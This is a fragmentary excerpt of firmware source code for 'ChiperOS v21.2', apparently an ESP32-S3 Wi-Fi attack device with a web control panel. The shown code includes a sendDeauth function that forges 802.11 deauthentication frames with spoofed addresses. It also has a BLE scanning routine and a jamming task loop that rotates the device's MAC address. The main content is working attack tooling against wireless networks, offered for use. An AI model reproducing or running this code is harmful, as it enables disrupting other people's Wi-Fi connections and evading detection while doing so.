/*
 * ChiperOS v21.2 - ESP32-S3 DEAUTH + WEB CONTROL (FIXED ORDER)
...
<div class='hd'><div class='kc'>KOSMOC CREATOR</div><div class='vr'>ChiperOS v21.2 - PATCHED</div><div class='bd'>ESP32-S3</div></div>
<div class='ct'>
<div class='tabs'>
...
void sendDeauth(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
    ...
    memcpy(&packet[4], da, 6); memcpy(&packet[10], sa, 6); memcpy(&packet[16], bssid, 6);    packet[22] = (seq & 0x0F) << 4; packet[23] = (seq >> 4) & 0xFF; seq++;
...
void hBleScan(){
  if(!pBLEScan){
    ...
    pBLEScan->setAdvertisedDeviceCallbacks(new MyScanCB());    pBLEScan->setInterval(100); pBLEScan->setWindow(99); pBLEScan->setActiveScan(true);
  }
...
// === TASK LOOPS ===
void runJam(){
  if(task!=M_JAM || !isLocked) return;  checkChannel(); rotateMac();
